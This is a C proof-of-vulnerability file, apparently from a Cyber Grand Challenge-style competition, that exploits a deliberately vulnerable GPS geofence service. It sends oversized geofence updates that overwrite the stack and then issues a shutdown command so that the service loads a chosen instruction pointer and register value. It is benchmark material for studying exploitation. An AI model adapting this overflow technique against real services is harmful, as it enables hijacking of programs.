/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include <libpov.h>

size_t ReadBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t total_bytes = 0;
	size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

size_t SendBytes( int fd, uint8_t *buf, size_t len ) 
{
	size_t tx_bytes;
	size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void NegotiateType1Pov( uint32_t ipmask, uint32_t regmask, uint32_t regnum, uint32_t *type1_ip, uint32_t *type1_reg) 
{
        uint32_t PovType = 1;

	// Request Type 1 negotitation
	if ( SendBytes( 3, (uint8_t*)&PovType, 4 ) != 4 )
		_terminate(-1);
	
	 // Send the ipmask
	 if ( SendBytes( 3, (uint8_t *)&ipmask, 4 ) != 4 )
		 _terminate(-1);

	 // Send the regmask
	 if ( SendBytes( 3, (uint8_t*)&regmask, 4 ) != 4)
		 _terminate(-1);
	 
	 // Send the register number we'll be controlling
	if ( SendBytes( 3, (uint8_t*)&regnum, 4 ) != 4 )
		_terminate(-1);

	// get the 4-byte value for eip
	if ( ReadBytes( 3, (uint8_t*)type1_ip, 4 ) != 4)
		_terminate(-1);
 
	// get the 4-byte value for the register
	if (ReadBytes( 3, (uint8_t*)type1_reg, 4 ) != 4)
		_terminate(-1);
}

uint8_t CalcCRC8( uint8_t *pData, uint16_t dataLen, uint8_t startVal )
{
	uint8_t crcVal = startVal;

	for ( uint16_t pos = 0; pos < dataLen; pos++ )
		crcVal += pData[pos];

	return crcVal;	
}

void SendCommand( uint8_t commandNum, uint8_t *pCommandData, uint16_t commandLength )
{
	SendBytes( STDOUT, &commandNum, 1 );
	SendBytes( STDOUT, (uint8_t*)&commandLength, 2 );
	
	if ( commandLength > 0 )
		SendBytes( STDOUT, pCommandData, commandLength );
	
	// Calculate crc
	uint8_t crcVal = CalcCRC8( &commandNum, 1, 0 );
	crcVal = CalcCRC8( (uint8_t*)&commandLength, 2, crcVal );

	if ( commandLength > 0 )
		crcVal = CalcCRC8( pCommandData, commandLength, crcVal );

	SendBytes( STDOUT, &crcVal, 1 );
}

void GetResponse( uint8_t *pDest, uint16_t *pDestLen )
{
	uint8_t crcVal;

	// Read response header
	typedef struct RESPONSE_HEADER
	{
		uint8_t commandNum;
		uint8_t responseType;
		uint16_t responseLength;
	} __attribute__((packed)) tResponseHeader;

	tResponseHeader oHeader;

	if ( ReadBytes( STDIN, (uint8_t*)&oHeader, sizeof(oHeader) ) != sizeof(oHeader) )
		_terminate( -1 );

	if ( oHeader.responseLength > 0 )
	{
		if ( ReadBytes( STDIN, pDest, oHeader.responseLength ) != oHeader.responseLength )
			_terminate( -1 );
	}

	if ( ReadBytes( STDIN, &crcVal, 1 ) != 1 )
		_terminate( -1 );

	(*pDestLen) = oHeader.responseLength;
}

#define EAX_REG_NUM	(0)
#define ECX_REG_NUM	(1)
#define EDX_REG_NUM	(2)
#define EBX_REG_NUM	(3)
#define ESP_REG_NUM	(4)
#define EBP_REG_NUM	(5)
#define ESI_REG_NUM	(6)
#define EDI_REG_NUM	(7)

#define COMMAND_SHUTDOWN	(1)
#define COMMAND_UPDATE_GEOFENCE (3)
#define COMMAND_GPS_ON		(6)

#define UPDATE_GEOFENCE_NEW	(0)
#define UPDATE_GEOFENCE_ADD	(1)

int main(void) 
{
	// Buffer for command data
	uint8_t commandData[1024];
	uint8_t responseData[4096];
	uint16_t responseLength;

	// ipmask -- mask of CB/RB instruction pointer
	// regmask -- mask of CB/RB register (specified by third argument)
	// 0 - eax, 1 - ecx, 2 - edx, 3 - ebx, 4 - esp, 5 - ebp, 6 - esi, 7 - edi
	unsigned int type1_ip;
	unsigned int type1_reg;
	NegotiateType1Pov( 0xffffffff, 0x1f1f0fff, ESI_REG_NUM, &type1_ip, &type1_reg );

	SendCommand( COMMAND_GPS_ON, NULL, 0 );
	GetResponse( responseData, &responseLength );

	// Send add geofence command
	commandData[0] = UPDATE_GEOFENCE_NEW;
	commandData[1] = 20; // Number of points to add
	
	for ( uint32_t i = 0; i < 20; i++ )
	{
		uint8_t *pDataPos = (commandData+2)+(i*10);
		
		*((uint32_t*)pDataPos) = 0xCAFEBABE;
		(pDataPos+4)[0] = 0xAA;
		(pDataPos+4)[1] = 0xAA;
		(pDataPos+4)[2] = 0xAA;
		(pDataPos+4)[3] = 0xAA;
		(pDataPos+4)[4] = 0xAA;
		(pDataPos+4)[5] = 0xAA;
	}

	SendCommand( COMMAND_UPDATE_GEOFENCE, commandData, (2+(20*10)) );
	GetResponse( responseData, &responseLength );

	// Send update geofence command
	uint8_t add_point_count = 7;

	commandData[0] = UPDATE_GEOFENCE_ADD;
	commandData[1] = add_point_count;	
	
	for ( uint32_t i = 0; i < add_point_count; i++ )
	{
		uint8_t *pDataPos = (commandData+2)+(i*10);
	
		if ( i == 6 )
			*((uint32_t*)pDataPos) = type1_ip;
		else
			*((uint32_t*)pDataPos) = 0xCAFEBABE;
		
		if ( i == 3 )
		{
			(pDataPos+4)[0] = 0x00;
			(pDataPos+4)[1] = 0x00;
			(pDataPos+4)[2] = 0x00;
			(pDataPos+4)[3] = 0x00;
			(pDataPos+4)[4] = 0x00;
			(pDataPos+4)[5] = 0x00;
		}
		else if ( i == 6 )
		{
			// Send type 1 register POV data (packed)
			uint32_t high_order_16bit = (type1_reg) & 0xFFFF;
			uint32_t middle_bits = (type1_reg >> 16) & 0x1F;
			uint32_t low_bits = ((type1_reg >> 24) & 0x1F);
	
			uint32_t resultValue = (high_order_16bit * 3600) + (middle_bits	* 60) + low_bits;

			(pDataPos+4)[0] = (resultValue >> 16) & 0xFF;
			(pDataPos+4)[1] = (resultValue >> 8) & 0xFF;
			(pDataPos+4)[2] = (resultValue & 0xFF);
			(pDataPos+4)[3] = 0xAC;
			(pDataPos+4)[4] = 0xAD;
			(pDataPos+4)[5] = 0xAE;
		}
		else
		{	
		(pDataPos+4)[0] = 0xAA;
		(pDataPos+4)[1] = 0xAA;
		(pDataPos+4)[2] = 0xAA;
		(pDataPos+4)[3] = 0xAA;
		(pDataPos+4)[4] = 0xAA;
		(pDataPos+4)[5] = 0xAA;
		}
	}

	SendCommand( COMMAND_UPDATE_GEOFENCE, commandData, (2+(add_point_count*10)) );
	GetResponse( responseData, &responseLength );

	// Shutdown -- this will trigger the stack unroll and the type 1 POV
	SendCommand( COMMAND_SHUTDOWN, NULL, 0 );
	GetResponse( responseData, &responseLength );

	return 0;
}
